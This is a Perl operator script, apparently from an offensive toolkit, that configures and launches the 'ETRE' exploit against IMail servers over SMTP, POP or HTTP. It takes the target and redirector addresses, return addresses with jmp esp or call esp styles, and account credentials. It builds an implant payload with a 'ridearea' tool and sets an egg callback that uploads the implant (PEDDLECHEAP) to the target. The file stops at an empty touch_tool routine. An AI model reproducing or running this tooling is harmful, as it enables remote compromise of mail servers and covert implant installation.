


use strict;
use vars qw($VERSION);

$::VERSION = "ETCETERARED Script: 1.0.4";
print "\n\n$::VERSION\n\n";



use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);


my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s", "n=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"n"})) {
	&EU_Log(1, "A -n option must be supplied.");
	&print_usage(0);
}

$::RIDEAREA	= "Resources\\Tools\\ridearea2.exe";	
$::RPCTOUCH	= "Resources\\Tools\\rpctouch.exe";		

$::LP_DLL	= "$opts{l}";					
$::PAYLOAD_DLL	= "$opts{f}";				
$::PAYLOAD_EXE	= "$opts{x}";				
$::PAYLOAD_EXE_NAME = "$opts{n}";			
$::EXPLOIT_EXE	= "$opts{e}\\ETRE.exe";					

$::EGG_SOCKET_NEW			= "2";			

$::IMPLANT_SOCKET_NEW		= "2";			
$::IMPLANT_SOCKET_MAINTAIN	= "3";			

$::RUN_EXPLOIT				= "1";			
$::RUN_PROBE_1				= "2";			
$::RUN_PROBE_2				= "3";			


my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIpIn      = $opts{"t"} if (defined $opts{"t"});


@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);



my	$logfile_prefix		= "ETRE_";			
my	$logfile_suffix		= "_script.log";	
my	$filename_suffix	= "_payload.bin";	

my	$TargetIp			= $TargetIpIn;		
my	$TargetPort			= 0;				
my	$ImplantSocketStatus= $::IMPLANT_SOCKET_NEW;	
my	$TimeOutValue		= 0;				

my	$PayloadFile		= "";				
my	$PayloadType		= "";				
my	$PayloadDropName	= "N/A";			
my	$TargetNetworkProtocol	= "N/A";		
	
my  $EggCallbackIp			= "127.0.0.1";		
my  $EggCallbackPort		= 0;				

my	$TargetVersion		= "";
my	$Username			= "";
my	$Password			= "";
my	$ReturnAddress		= "";
my	$TargetHostname		= "";
my	$ReturnStyle		= "";
my	$PathLength			= "";
my	$CustomAlias		= "";
my	$RealIp				= "";
my	$RealPort			= "";



&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	



if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}


$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);



&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");



&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");




($TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
 $TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort, $TargetVersion, $Username, $Password, $ReturnAddress, $TargetHostname, $ReturnStyle, $PathLength, $CustomAlias, $RealIp, $RealPort) =
	&validate_parms($work_dir, $root_dir, $TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	$TimeOutValue, $TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort);

my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}



my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

$year += 1900;
$mon  += 1;

my $RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);


if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
	if ($PayloadDropName eq "N/A") {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");
	}
	else {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");	
	}
}
elsif( $ImplantSocketStatus eq $::IMPLANT_SOCKET_NEW ) {
	if ($PayloadDropName eq "N/A") {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");
	}
	else {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");	
	}
}





my $flags;
if($ExploitUtils::EU_VERBOSE) { $flags = "-v"; }
else { $flags = ""; }

my $variableArgs = "";
if($TargetVersion == 9999) {
	$variableArgs .= " -A $ReturnAddress -C $ReturnStyle";
} else {
	$variableArgs .= "";
}

if(($TargetNetworkProtocol eq "pop") || ($TargetNetworkProtocol eq "http")) {
	$variableArgs .= " -n \"$Username\" -a \"$Password\"";
} else {
	$variableArgs .= "";
}

if($CustomAlias eq "") {
	$variableArgs .= "";
} else {
	$variableArgs .= " -L \"$CustomAlias\"";
}

&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");

my $ImplantPayload = $RA_Payload;

&EU_RunCommand("start \"ETRE Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT $variableArgs -H $TargetHostname -d $PathLength -i $TargetIp -p $TargetPort -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetNetworkProtocol -V $TargetVersion -X $RealIp -x $RealPort\"");


my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");



sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
			 [-t <target IP>] [-l <lp dll>]
             [-f <payload dll>] 
			 [-x <payload exe> [-n <Payload Dropname>]]
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.
  
  -l <lp dll>           Filename of the listening post dll.

  -f <payload dll>      Filename of the implant payload (dll).

  -x <payload exe>      Filename of the implant payload (exe).

  -n <payload dropname> Filename to be used for the dropped executable 

~;
	}

	&EU_ExitMessage(1,"End of help.");
}


sub validate_parms() {
	my ($work_dir, $root_dir, $TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	   $TimeOutValue,$TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort) = @_;

	my ($continue, $retcode, $vol, $dir);
	my ($redirectFlag);
	my $OrgTargetIp			= $TargetIp;
	my $RedirectionIp		= "127.0.0.1";
	my $Username			= "";
	my $Password			= "";
	my $ReturnAddress		= "";
	my $TargetHostname		= "";
	my $ReturnStyle			= "";
	my $PathLength			= "";
	my $CustomAlias			= "";
	my $RealIp				= "";
	my $RealPort			= "";

	my ($LocalIp);

	my $NetworkProtocolOption0	= "SMTP (usually port 25) [DEFAULT]";
	my $NetworkProtocolOption1	= "POP (usually port 110)";
	my $NetworkProtocolOption2	= "HTTP (usually port 8383)";
	my $NetworkProtocolSelected    = 0;

	my $ReturnStyleOption0	= "jmp esp / push esp; ret [DEFAULT]";
	my $ReturnStyleOption1	= "call esp";
	my $ReturnStyleSelected = 0;






	my $not			= "NOT GOOD";
    my $imail810	= "8.10";
	my $imail811	= "8.11";
	my $imail812    = "8.12";
	my $imail813	= "8.13";
	my $imail813EVAL= "8.13 EVAL";
	my $imail814	= "8.14";
	my $imail815	= "8.15";
	my $imail821	= "8.21";
	my $imail822	= "8.22";

	$LocalIp = &EU_GetLocalIP("Enter the local IP Address", $LocalIp);
	&EU_Log(0, "Enter the local IP Address:  $LocalIp");
	while (1) {



		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
		&EU_Log(1,"   1) $::PAYLOAD_EXE ($::PAYLOAD_EXE_NAME)");		
		while(1) {
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") {
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";
				$PayloadDropName = "N/A";
			}
			elsif($retcode eq "1") { 
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
				$PayloadFile = $::PAYLOAD_EXE;
				$PayloadType = "e";
				$PayloadDropName = $::PAYLOAD_EXE_NAME;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 



		&EU_Log(1,"\nSelect the Target Network Protocol To Use:\n");
		&EU_Log(1,"   0) $NetworkProtocolOption0");
		&EU_Log(1,"   1) $NetworkProtocolOption1");
		&EU_Log(1,"   2) $NetworkProtocolOption2");
		while(1) {
			$NetworkProtocolSelected = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");
			if (($NetworkProtocolSelected lt "0") or ($NetworkProtocolSelected gt "3")){
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			if ($NetworkProtocolSelected eq "0") { $TargetNetworkProtocol  = "smtp"; $TargetPort = 25; }
			elsif($NetworkProtocolSelected eq "1") {$TargetNetworkProtocol = "pop"; $TargetPort = 110; }
			elsif($NetworkProtocolSelected eq "2") {$TargetNetworkProtocol = "http"; $TargetPort = 8383; }

			last;
		}  

		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED ([y],n)? ", "y");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { $redirectFlag = 1; }
		else { $redirectFlag = 0; }



		if( $redirectFlag == 0 ) {


			$TargetIp = $OrgTargetIp;  
			$TargetIp = &EU_GetIP("\nEnter the target IP Address", $TargetIp);
			&EU_Log(0, "Enter the target IP Address:  $TargetIp");

			$TargetPort = &EU_GetPort("\nEnter the target Port", $TargetPort);
			&EU_Log(0, "Enter the target Port:  $TargetPort");


			&EU_Log(1, "\nThe ETRE Exploit Payload must callback in order to upload the Implant Payload.");

			&EU_Log(1, "The local IP Address should be used as the Egg callback IP Address.");

			$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback IP Address", $LocalIp);
			&EU_Log(0, "Enter the Egg callback IP Address:  $EggCallbackIp");

			if ($TargetNetworkProtocol eq "smtp") { $EggCallbackPort = 25; }
			elsif ($TargetNetworkProtocol eq "pop") { $EggCallbackPort = 110; }
			elsif ($TargetNetworkProtocol eq "http") { $EggCallbackPort = 8383; }

			$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
		}

		else {


			$RedirectionIp = &EU_GetIP("\nEnter the Redirection IP address", $RedirectionIp);
			&EU_Log(0, "Enter the target IP Address:  $RedirectionIp");
			$TargetIp = $RedirectionIp;

			$TargetPort = &EU_GetPort("Enter the redirection Port");
			&EU_Log(0,"Enter the redirection Port: $TargetPort");

			&EU_Log(1, "\nThe ETRE Exploit Payload must callback in order to");
			&EU_Log(1, "upload the Implant Payload.  The callback IP Address MUST be that of");
			&EU_Log(1, "the Redirector.  The callback Port MUST be the same number on both");
			&EU_Log(1, "the Redirector and the local machine, else redirection will fail.");
			&EU_Log(1, "The local machine uses this port to listen for the callback, and the");
			&EU_Log(1, "ETRE Exploit Payload uses it to call back to the Redirector.");

			&EU_Log(1, "\nThe redirection IP Address should be used as the Egg callback IP Address.");
			$EggCallbackIp = &EU_GetIP("Enter the Egg callback IP Address");
			&EU_Log(0, "Enter the Egg callback IP Address:  $EggCallbackIp");

			if ($TargetNetworkProtocol eq "smtp") { $EggCallbackPort = 25; }
			elsif ($TargetNetworkProtocol eq "pop") { $EggCallbackPort = 110; }
			elsif ($TargetNetworkProtocol eq "http") { $EggCallbackPort = 8383; }

			$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
		}

		if ($redirectFlag == 1)
		{
			$TargetIp = $RedirectionIp;
		}

		if (($redirectFlag == 1) && ($TargetNetworkProtocol eq "http")) {
			&EU_Log(1, "\nHTTP access combined with redirection requires knowing the actual target's IP and port.\n");

			$RealIp = &EU_GetIP("Enter the actual target's IP address", $RealIp);
			&EU_Log(0, "Enter the actual target's IP Address:  $RealIp");

			$RealPort = &EU_GetPort("Enter the actual target's Port");
			&EU_Log(0,"Enter the actual target's Port: $RealPort");
		}
		else {
			$RealIp = $TargetIp;
			$RealPort = $TargetPort;
		}

		if($PayloadType eq "d") {
			$retcode = &EU_GetInput("\nMaintain the egg socket for use by the implant ([y],n)? ", "y");
			if( $retcode eq "y" or $retcode eq "Y" ) {
				$ImplantSocketStatus = $::IMPLANT_SOCKET_MAINTAIN;
				&EU_Log(1,"The socket connection will be used for the duration of the operation,\nincluding the PEDDLECHEAP connection with the Listening Post.\n");
			}
			else {
				$ImplantSocketStatus = $::IMPLANT_SOCKET_NEW;
				&EU_Log(1,"The exploit socket connection will be used only to deliver PEDDLECHEAP.\nYou must launch the Listening Post separately.");
			}
		}
		else { 
			$ImplantSocketStatus = $::IMPLANT_SOCKET_NEW;
		}


		my $default_timeout = 60;

		if ($TargetNetworkProtocol eq "pop") {
			$default_timeout = 7200;
			&EU_Log(1, "\nUploading the exploit via POP will not result in immediate execution.");
			&EU_Log(1, "The target's mail processor will read queued files over a fixed interval.");
			&EU_Log(1, "By default, IMail will process files every 30 minutes (1800 seconds), but it is configurable up to a maximum of 2 hours (7200 seconds).");
		}
		else {
			&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
			&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		}
		
		$retcode = &EU_GetInput("Use default value of $default_timeout sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of $default_timeout sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "$default_timeout") ) {
			$TimeOutValue = "$default_timeout";
		}
		else {
			if ($TargetNetworkProtocol eq "pop") {
				$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 900): ");
				&EU_Log(0, "Enter new time-out value (greater than 900):  $TimeOutValue");
			}
			else {
				$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
				&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
			}
		}

		if(($TargetNetworkProtocol eq "pop") || ($TargetNetworkProtocol eq "http")) {
			$Username = &EU_GetInput("\nEnter a valid username on the target server: ", "");
			$Password = &EU_GetInput("Enter the password for the account: ", "");
		}
		else {
			$Username = "N/A";
			$Password = "N/A";
		}

		&EU_Log(1, "\nEnter the path *length* of the target's IMail installation directory.  This is not needed for the exploit to work, but is used to verify that the exploit falls within size limitations.  Smaller numbers are more likely to work.  As the target hostname length grows, the maximum value of this number grows.  As an example, the default path \"C:\\IMail\" has a path length of 8.");
		$PathLength = &EU_GetInput("Enter a path length: [8] ", "8");

		

		my $enterManually = "n";
		my $OverrideRetAddr = 0;
		&EU_Log(1, "\n\nThe selections which will follow are meant to aid the operator in properly");
		&EU_Log(1, "configuring the exploit to work on the target of interest.  However,");
		&EU_Log(1, "in the interest of being as flexible as possible, you may manually specify");
		&EU_Log(1, "the return address that the exploit needs to be successful.");
		&EU_Log(1, "NOTE: DO NOT answer yes to this question without consulting the");
		&EU_Log(1, "developer, this should be used as a LAST resort.\n");

		if(($TargetNetworkProtocol eq "smtp") || ($TargetNetworkProtocol eq "pop")) {
			&EU_Log(1, "\nSMTP and POP should not ever need custom return addresses, but the option is left available.");
		}
		else {
			&EU_Log(1, "\nHTTP requires custom return addresses, following (approximately, see docs) a character restriction of no high-order bits, i.e. no chars > 0x7e.");
		}

		if(($TargetNetworkProtocol eq "smtp") || ($TargetNetworkProtocol eq "pop")) {
			$enterManually = &EU_GetInput("\nEnter the return address manually (y,[n])? ", "n");
		}
		else {
			$enterManually = "y";
		}
		
		if(($enterManually eq "y") or ($enterManually eq "Y") or ($TargetNetworkProtocol eq "http")) {
			$OverrideRetAddr = 1;

			while(1) {
				my $addr = "";
				$addr = &EU_GetInput("\nEnter return address in the form 0x????????> ", "");
				
				if($addr =~ /(0x[A-Fa-f0-9]{6,8})/) {
					$ReturnAddress = $1;
					&EU_Log(1, "RA: $ReturnAddress.");
					last;
				} else {
					&EU_Log(1, "Not a valid address. Try again.");
					next;
				}
			}

			&EU_Log(1,"\nSelect the Return Address Style:\n");
			&EU_Log(1,"   1) $ReturnStyleOption0");
			&EU_Log(1,"   2) $ReturnStyleOption1");
			while(1) {
				$ReturnStyleSelected = &EU_GetInput("\nEnter selection [1]: ", "1");
				&EU_Log(0, "\nEnter selection [1]: $retcode");
				if (($ReturnStyleSelected lt "1") or ($ReturnStyleSelected gt "3")){
					&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
					next;
				}
				if ($ReturnStyleSelected eq "1") { $ReturnStyle  = "1";}
				elsif($ReturnStyleSelected eq "2") {$ReturnStyle = "2";}

				last;
			}  

		} else {
			$OverrideRetAddr = 0;
		}

		&EU_Log(1, "\n\nYou should never need a custom alias unless you have a very specific reason."); 
		$retcode = &EU_GetInput("\nUse a custom list alias (y,[n])? ", "n");
		if( $retcode eq "y" or $retcode eq "Y" ) {
			$CustomAlias = &EU_GetInput("\nEnter a valid list server alias on the target server: ", "imailsrv");
		}



		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory      : $root_dir");
		&EU_Log(1,"\tLocal IP            : $LocalIp");
		&EU_Log(1,"\tPayload file        : $PayloadFile");
		&EU_Log(1,"\tPayload drop name   : $PayloadDropName");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection   : True");
			&EU_Log(1,"\tRedirector IP       : $TargetIp");
			&EU_Log(1,"\tRedirector Port     : $TargetPort");

			if ($TargetNetworkProtocol eq "http") {
				&EU_Log(1,"\tReal Target IP      : $RealIp");
				&EU_Log(1,"\tReal Target Port    : $RealPort");
			}
		}
		else {
			&EU_Log(1,"\tUsing Redirection   : False");
			&EU_Log(1,"\tTarget IP           : $TargetIp");
			&EU_Log(1,"\tTarget Port         : $TargetPort");
		}
		&EU_Log(1,"\tEgg Callback IP     : $EggCallbackIp");
		&EU_Log(1,"\tEgg Callback Port   : $EggCallbackPort");

		&EU_Log(1,"\tProtocol            : $TargetNetworkProtocol");

		&EU_Log(1,"\tNetwork Time Out    : $TimeOutValue sec");
		
		&EU_Log(1,"\tUsername            : $Username");
		&EU_Log(1,"\tPassword            : $Password");

		if ($CustomAlias ne "") {
			&EU_Log(1,"\tCustom Alias        : $CustomAlias");
		}

		&EU_Log(1,"\tPath Length         : $PathLength");

		my $probeString = "";
		if ($OverrideRetAddr == 1) {
			$probeString = "Manual - $ReturnAddress \tCustom Style - $ReturnStyle";
		} else {
			$probeString = "Version Probe";
		}
		&EU_Log(1,"\tReturn Address      : $probeString");

		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			; 
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}


		my $probeFlag = "n";			
		my $IMailVersion = $not;		

		$probeFlag = &EU_GetInput("\nUse IMail touch tool to obtain the version ([y],n)? ", "y");

		if(($probeFlag eq "y") or ($probeFlag eq "Y"))
			{
			my $probeError;
			my $probeType;

			($IMailVersion, $TargetHostname, $probeError) = &touch_tool($root_dir,$TargetIp,$TargetPort, $TargetNetworkProtocol, $TimeOutValue, $RealIp, $RealPort);

			if($OverrideRetAddr == 1)
				{
				if( ($probeError == 1) or ($IMailVersion eq $not))
					{
					&EU_Log(1, "\nProbe failed to find a supported IMail version, but using a custom address instead.");
					$TargetVersion = 9999;
					}
				elsif( ($probeError == 0) and ($IMailVersion ne $not) and ($TargetNetworkProtocol ne "http"))
					{
					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					&EU_Log(1, "\nThe probe found a supported IMail version.  You should NOT be using a custom address unless it's HTTP!");
					$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
					&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") )
						{
						&EU_ExitMessage(1,"User terminated script\n");
						}
					elsif( ($continue eq "n") or ($continue eq "N") )
						{
						&EU_Log(1, "Returning to top of script...\n");
						next;
						}

					$IMailVersion = "Custom";
					$TargetVersion = 9999;
					}
				elsif( ($probeError == 0) and ($TargetNetworkProtocol eq "http") )
					{
					&EU_Log(1, "\nThe probe found a supported IMail version.  A custom return address will be used with HTTP.");
					$IMailVersion = "Custom";
					$TargetVersion = 9999;
					}
				}
			else
				{
				if( ($probeError == 1) or ($IMailVersion eq $not))
					{


					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
					&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");
			
					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") )
						{
						&EU_ExitMessage(1,"User terminated script\n");
						}
					elsif( ($continue eq "n") or ($continue eq "N") )
						{
						&EU_Log(1, "Returning to top of script...\n");
						next;
						}

					if( ($probeError == 1) and ($IMailVersion eq $not))
						{
						&EU_Log(1, "No version is set.  Forcing a return to top of script...\n");
						next;
						}
					}
				elsif( ($IMailVersion eq $imail810) and ($probeError == 0) )
					{
					$TargetVersion = 0;
					}
				elsif( ($IMailVersion eq $imail811) and ($probeError == 0) )
					{
					$TargetVersion = 1;
					}
				elsif( ($IMailVersion eq $imail812) and ($probeError == 0) )
					{
					$TargetVersion = 2;
					}
				elsif( ($IMailVersion eq $imail813) and ($probeError == 0) )
					{
					$TargetVersion = 3;
					}
				elsif( ($IMailVersion eq $imail813EVAL) and ($probeError == 0) )
					{
					$TargetVersion = 4;
					}
				elsif( ($IMailVersion eq $imail814) and ($probeError == 0) )
					{
					$TargetVersion = 5;
					}
				elsif( ($IMailVersion eq $imail815) and ($probeError == 0) )
					{
					$TargetVersion = 6;
					}
				elsif( ($IMailVersion eq $imail821) and ($probeError == 0) )
					{
					$TargetVersion = 7;
					}
				elsif( ($IMailVersion eq $imail822) and ($probeError == 0) )
					{
					$TargetVersion = 8;
					}
				}
			}
		else
			{

			while(1)
				{
		      	&EU_Log(1,"\n*********************************************************************");
		      	&EU_Log(1,"Set IMail Version");
		      	&EU_Log(1,"CAUTION: - An improper selection may crash the target");
				&EU_Log(1,"*********************************************************************");
		      	&EU_Log(1,"   0) $imail810");
				&EU_Log(1,"   1) $imail811");
				&EU_Log(1,"   2) $imail812");
				&EU_Log(1,"   3) $imail813");
				&EU_Log(1,"   4) $imail813EVAL");
				&EU_Log(1,"   5) $imail814");
				&EU_Log(1,"   6) $imail815");
				&EU_Log(1,"   7) $imail821");
				&EU_Log(1,"   8) $imail822");

				if ($OverrideRetAddr == 1)
					{
					&EU_Log(1,"9999) Continue with Custom Return Address: $ReturnAddress");
					$IMailVersion = &EU_GetInput("\nUse default selection [9999]: ", "y");
					}
		      	else
					{
					$IMailVersion = &EU_GetInput("\nUse default selection [0]: ", "y");
					}

		      	if( ($OverrideRetAddr != 1) and ( $IMailVersion eq "y" or $IMailVersion eq "Y" or $IMailVersion eq "0" ))
					{
					$IMailVersion = $imail810;
					$TargetVersion = 0;
					}
				elsif( $IMailVersion eq "1"  )
					{
					$IMailVersion = $imail811;				
					$TargetVersion = 1;
					}
				elsif( $IMailVersion eq "2"  )
					{
					$IMailVersion = $imail812;				
					$TargetVersion = 2;
					}
				elsif( $IMailVersion eq "3"  )
					{
					$IMailVersion = $imail813;				
					$TargetVersion = 3;
					}
				elsif( $IMailVersion eq "4"  )
					{
					$IMailVersion = $imail813EVAL;				
					$TargetVersion = 4;
					}
				elsif( $IMailVersion eq "5"  )
					{
					$IMailVersion = $imail814;				
					$TargetVersion = 5;
					}
				elsif( $IMailVersion eq "6"  )
					{
					$IMailVersion = $imail815;				
					$TargetVersion = 6;
					}
				elsif( $IMailVersion eq "7"  )
					{
					$IMailVersion = $imail821;				
					$TargetVersion = 7;
					}
				elsif( $IMailVersion eq "8"  )
					{
					$IMailVersion = $imail822;				
					$TargetVersion = 8;
					}
				elsif( ($OverrideRetAddr == 1) and ( $IMailVersion eq "y" or $IMailVersion eq "Y" or $IMailVersion eq "9999" ))
					{
					$IMailVersion = "Custom";
					$TargetVersion = 9999;
					}
				else
					{
					&EU_Log(1, "Invalid choice. Try again or enter 'quit'.");
					next;
	      			}

				last;
				}
			}

		if(($TargetNetworkProtocol eq "pop") || ($TargetNetworkProtocol eq "http")) {



			my $probeFlag = "n";			
			my $IMailVersion = $not;		
			my $host;

			$probeFlag = &EU_GetInput("\nUse IMail touch tool to verify $Username / $Password account ([y],n)? ", "y");

			if(($probeFlag eq "y") or ($probeFlag eq "Y")) {
				my $probeError;
				my $probeType;

				($host, $probeError) = &password_touch_tool($root_dir,$TargetIp,$TargetPort, $TargetNetworkProtocol, $TimeOutValue, $Username, $Password, $RealIp, $RealPort);

				if($probeError == 1) {


					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
					&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
						&EU_ExitMessage(1,"User terminated script\n");
					}
					elsif( ($continue eq "n") or ($continue eq "N") ) {
						&EU_Log(1, "Returning to top of script...\n");
						next;
					}
				}
				elsif($probeError == 0) {

					if ($TargetNetworkProtocol eq "http") {
						$TargetHostname = $host;
					}
				}
				else {
					&EU_Log(1, "\nProbe returned invalid results.  Returning to top of script...\n");
					next;
				}
			}
			else {
				&EU_Log(1, "Using unverified $Username / $Password for login account.");
			}
			} 

			if ($TargetHostname eq "") {
				&EU_Log(1, "\nProbes did not find the target hostname, it must be set manually.");
				$TargetHostname = &EU_GetInput("Enter the target hostname: ", "");
			}
			
			$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
			&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

			if( ($continue eq "y") or ($continue eq "Y") ) {
				last;
			} 
			elsif( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
				&EU_ExitMessage(1,"User terminated script\n");
			}
			else {
				&EU_Log(1, "Returning to top of script...\n");
				next;
			}


	} 



	return ($TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
			$TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort, $TargetVersion, $Username, $Password, $ReturnAddress, $TargetHostname, $ReturnStyle, $PathLength, $CustomAlias, $RealIp, $RealPort);
}


sub touch_tool() {

